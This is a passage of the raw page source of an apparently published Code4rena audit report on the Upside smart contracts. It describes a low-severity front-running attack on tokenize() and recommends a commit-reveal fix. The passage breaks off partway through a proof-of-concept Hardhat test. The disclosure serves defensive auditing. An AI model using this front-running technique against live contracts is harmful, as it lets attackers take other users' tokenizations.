software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"18:Tefe9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-05-upside\"\u003eC4 Upside repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-609\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eBrene\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-238\"\u003e0xcb90f054\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-373\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-117\"\u003e0xozovehe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-594\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-502\"\u003ebefree3x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-680\"\u003ec0pp3rscr3w3r\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-420\"\u003eCasinoCompiler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-226\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-396\"\u003edystopia\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-251\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-115\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-287\"\u003eharry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-465\"\u003ehgrano\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-648\"\u003eJamil\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-171\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-618\"\u003eMrPotatoMagic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-243\"\u003epeppef\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-517\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-434\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-423\"\u003eret2basic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-436\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-454\"\u003eSafetyBytes\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-547\"\u003esakibcy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-203\"\u003eSakursf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-353\"\u003eTigerfrake\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-407\"\u003evaminator\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-front-running-attack-in-tokenize-function\" style=\"position:relative;\"\u003e\u003ca href=\"#01-front-running-attack-in-tokenize-function\" aria-label=\"01 front running attack in tokenize function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Front-running attack in tokenize function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003etokenize()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e contract allows users to tokenize the provided \u003ccode\u003eurl\u003c/code\u003e. A critical parameter governing this process is \u003ccode\u003etokenizeFeeEnabled\u003c/code\u003e, which determines whether users must pay a fee in order to call the function. When this flag is set to \u003ccode\u003efalse\u003c/code\u003e, users can freely call \u003ccode\u003etokenize()\u003c/code\u003e without paying any fee.\u003c/p\u003e\n\u003cp\u003eThis design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same \u003ccode\u003etokenize()\u003c/code\u003e call with a higher gas price to get their transaction mined first.\nOnce the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emetaCoinAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis causes \u003ccode\u003eurlToMetaCoinMap[_ur]\u003c/code\u003e to be non-zero. Therefore, when user1â€™s transaction is eventually mined, the following check fails:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMetaCoinExists\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAttackers can steal high-value URLs (e.g., popular brand names).\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRequire users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn PoC.test.ts, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should permit user2 to execute transactions ahead of user1\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;https://example1.com\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee configuration\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan 